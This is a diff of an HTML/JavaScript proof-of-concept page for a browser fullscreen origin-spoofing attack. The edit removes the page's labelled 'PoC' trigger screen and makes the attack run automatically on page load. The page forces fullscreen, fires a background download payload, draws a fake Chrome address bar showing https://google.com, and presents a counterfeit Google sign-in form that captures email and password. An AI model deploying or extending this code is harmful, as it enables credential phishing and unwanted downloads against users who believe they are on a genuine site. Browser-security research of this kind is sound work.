@@ -8,96 +8,10 @@
   body {
     margin: 0;
     padding: 0;
-    background: #f8f9fa;
+    background: #f0f2f5;
     font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
     color: #1a1a1a;
     overflow: hidden;
-  }
-
-  .container {
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    text-align: center;
-    padding: 20px;
-  }
-
-  .title {
-    font-size: 1.4rem;
-    font-weight: 700;
-    line-height: 1.5;
-    margin-bottom: 20px;
-    max-width: 800px;
-    color: #202124;
-  }
-
-  .subtitle {
-    font-size: 0.85rem;
-    color: #d32f2f;
-    margin-top: 10px;
-    font-family: 'Courier New', Courier, monospace;
-    background: #fce8e6;
-    padding: 12px 16px;
-    border-radius: 6px;
-    border: 1px solid #fad2cf;
-    line-height: 1.5;
-  }
-
-  .trigger-btn {
-    padding: 16px 32px;
-    font-size: 1.1rem;
-    font-weight: 600;
-    background: #d32f2f;
-    color: white;
-    border: none;
-    border-radius: 8px;
-    cursor: pointer;
-    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-    transition: background 0.2s;
-    margin-top: 25px;
-  }
-
-  .trigger-btn:hover {
-    background: #b71c1c;
-  }
-
-  #fake-fullscreen-toast {
-    position: fixed;
-    top: 20px;
-    left: 50%;
-    transform: translateX(-50%);
-    background: rgba(32, 33, 36, 0.95);
-    color: #e8eaed;
-    padding: 12px 24px;
-    border-radius: 8px;
-    font-family: 'Roboto', 'Segoe UI', system-ui, sans-serif;
-    font-size: 14px;
-    font-weight: 500;
-    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
-    opacity: 0;
-    pointer-events: none;
-    transition: opacity 0.5s ease-in-out;
-    z-index: 999999;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
-
-  #fake-fullscreen-toast.visible {
-    opacity: 1;
-  }
-
-  .fake-content {
-    display: none;
-    height: 100vh;
-    background: #ffffff;
-    overflow-x: hidden;
-  }
-  
-  .fake-content.active {
-    display: block;
   }
 
   /* --- FAKE BROWSER UI STYLES --- */
@@ -129,6 +43,9 @@
     display: flex;
     align-items: center;
     box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+    max-width: 800px;
+    margin: 0 auto;
+    width: 100%;
   }
 
   .lock-icon {
@@ -219,65 +136,73 @@
   .button-primary:hover {
     background: #1a73e8;
   }
+
+  #fake-fullscreen-toast {
+    position: fixed;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(32, 33, 36, 0.95);
+    color: #e8eaed;
+    padding: 12px 24px;
+    border-radius: 8px;
+    font-family: 'Roboto', 'Segoe UI', system-ui, sans-serif;
+    font-size: 14px;
+    font-weight: 500;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.5s ease-in-out;
+    z-index: 10000;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  #fake-fullscreen-toast.visible {
+    opacity: 1;
+  }
 </style>
 </head>
 <body>
 
-  <!-- Initial View: Hidden trigger area -->
-  <div class="container" id="initial-view" style="display: none;">
-    <div class="title">
-      PoC: Bypass Origin to Remove Source Display<br>
-      in Fullscreen via Blob URL Fullwidth Solidus
-    </div>
-    <div class="subtitle">
-      Injection Vector:<br>
-      <strong>blob:null/[uuid]#%EF%BC%8Fgoogle.com</strong><br><br>
-      Effect: Origin Spoofing & True Domain Disappearance
-    </div>
-    <button class="trigger-btn" onclick="initiateAttackSequence()">
-      Execute Payload & Enter Fullscreen
-    </button>
-  </div>
-
   <!-- Fake Browser View: Simulates Chrome browser with fake address bar and login form -->
-  <div class="fake-content" id="fake-view">
-    <div class="fake-browser">
-      <!-- Fake Address Bar -->
-      <div class="fake-address-bar">
-        <div class="fake-url-box">
-          <svg class="lock-icon" viewBox="0 0 24 24">
-            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
-          </svg>
-          <span>https://google.com</span>
-        </div>
+  <div class="fake-browser">
+    <!-- Fake Address Bar -->
+    <div class="fake-address-bar">
+      <div class="fake-url-box">
+        <svg class="lock-icon" viewBox="0 0 24 24">
+          <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+        </svg>
+        <span>https://google.com</span>
       </div>
-      
-      <!-- Fake Content Area with Google Login Form -->
-      <div class="fake-content-area" id="fake-content-area">
-        <div class="login-box">
-          <!-- Google Logo SVG -->
-          <svg class="google-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
-            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
-            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
-            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
-          </svg>
-          
-          <h2 class="login-title">Sign in</h2>
-          <p class="login-subtitle">to continue to google.com</p>
-          
-          <div class="input-group">
-            <label for="email">Email or phone</label>
-            <input type="text" id="email" class="login-input" placeholder="Enter your email or phone" required>
-          </div>
-          
-          <div class="input-group">
-            <label for="password">Password</label>
-            <input type="password" id="password" class="login-input" placeholder="Enter your password" required>
-          </div>
-          
-          <button class="button-primary" onclick="handleLoginClick()">Sign in</button>
+    </div>
+    
+    <!-- Fake Content Area with Google Login Form -->
+    <div class="fake-content-area" id="fake-content-area">
+      <div class="login-box">
+        <!-- Google Logo SVG -->
+        <svg class="google-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+        </svg>
+        
+        <h2 class="login-title">Sign in</h2>
+        <p class="login-subtitle">to continue to google.com</p>
+        
+        <div class="input-group">
+          <label for="email">Email or phone</label>
+          <input type="text" id="email" class="login-input" placeholder="Enter your email or phone" required>
         </div>
+        
+        <div class="input-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" class="login-input" placeholder="Enter your password" required>
+        </div>
+        
+        <button class="button-primary" onclick="handleLoginClick()">Sign in</button>
       </div>
     </div>
   </div>
@@ -290,42 +215,30 @@
 
   <script>
     /**
-     * Auto-execute attack sequence on page load
+     * Initialize attack on page load
+     * Automatically enters fullscreen and executes payload
      */
-    window.addEventListener('load', function() {
+    window.addEventListener('load', () => {
+      // Auto-enter fullscreen on page load
       setTimeout(() => {
-        initiateAttackSequence();
-      }, 100);
-    });
-
-    /**
-     * Main attack sequence function
-     * Triggers fullscreen mode, executes download payload, and switches to fake browser UI
-     */
-    function initiateAttackSequence() {
-      // Step 1: Request browser fullscreen mode to hide real address bar
-      const elem = document.documentElement;
-      if (elem.requestFullscreen) {
-        elem.requestFullscreen();
-      } else if (elem.webkitRequestFullscreen) {
-        elem.webkitRequestFullscreen();
-      }
-
-      // Step 2: Execute background download payload via hidden iframe
-      executeDownloadPayload();
-
-      // Step 3: UI redressing - switch to fake browser with Google login form
-      setTimeout(() => {
-        document.getElementById('initial-view').style.display = 'none';
-        document.getElementById('fake-view').classList.add('active');
+        const elem = document.documentElement;
+        if (elem.requestFullscreen) {
+          elem.requestFullscreen().catch(err => {
+            console.log("Fullscreen request failed:", err);
+          });
+        } else if (elem.webkitRequestFullscreen) {
+          elem.webkitRequestFullscreen();
+        }
         
-        // Display fake fullscreen toast notification after delay
+        // Execute download payload
+        executeDownloadPayload();
+        
+        // Show fake fullscreen toast
         setTimeout(() => {
           document.getElementById('fake-fullscreen-toast').classList.add('visible');
-        }, 2500);
-
+        }, 1000);
       }, 500);
-    }
+    });
 
     /**
      * Download payload execution
@@ -401,13 +314,11 @@
         // Demonstration: Show captured credentials
         alert(`[PHISHING DEMONSTRATION]\n\nCredentials captured:\nEmail: ${email}\nPassword: ${password}\n\nUser believed they were on https://google.com due to fake address bar and fullscreen mode.`);
         
-        // Exit fullscreen and reset
+        // Exit fullscreen and reload
         if (document.exitFullscreen) {
           document.exitFullscreen();
         }
-        document.getElementById('fake-fullscreen-toast').classList.remove('visible');
-        document.getElementById('fake-view').classList.remove('active');
-        document.getElementById('initial-view').style.display = 'flex';
+        location.reload();
       } else {
         alert('Please enter email and password');
       }
@@ -415,13 +326,11 @@
 
     /**
      * Fullscreen change event handler
-     * Cleans up fake UI and toast when user exits fullscreen mode
+     * Cleans up fake toast when user exits fullscreen mode
      */
     document.addEventListener('fullscreenchange', () => {
       if (!document.fullscreenElement) {
         document.getElementById('fake-fullscreen-toast').classList.remove('visible');
-        document.getElementById('fake-view').classList.remove('active');
-        document.getElementById('initial-view').style.display = 'flex';
       }
     });
   </script>
